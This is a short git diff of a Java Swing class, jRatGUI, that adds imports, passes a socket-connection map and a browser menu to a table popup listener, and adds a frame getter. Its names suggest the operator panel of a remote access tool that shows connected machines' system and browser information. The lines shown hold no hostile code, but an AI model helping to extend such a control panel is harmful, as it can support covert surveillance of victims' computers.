@@ -3,6 +3,8 @@ package Server.ServerGUI;
 import Server.ServerConnections.Server;
 import Server.ServerConnections.Streams;
 import Server.ServerGUI.TableUtils.*;
+import Server.ServerGUI.TableUtils.TableConfig.StateColumnRenderer;
+import Server.ServerGUI.TableUtils.TableConfig.TableModel;
 import com.formdev.flatlaf.FlatDarkLaf;
 
 import javax.swing.*;
@@ -98,7 +100,7 @@ public class jRatGUI {
 
 
         ConcurrentHashMap<Socket, Streams> map = server.getMap();
-        connectionTable.addMouseListener(new TablePopUpListener(connectionTable));
+        connectionTable.addMouseListener(new TablePopUpListener(connectionTable,map,browserMenu));
         browserMenu.addMenuListener(new BrowserMenuListener(connectionTable,browserMenu,map));
         sysInfoMenu.addActionListener(new SystemInformationListener(connectionTable,map));
 
@@ -127,6 +129,9 @@ public class jRatGUI {
 
     }
 
+    public JFrame getFrame() {
+        return frame;
+    }
 
     public JTable getConnectionTable() {
         return connectionTable;
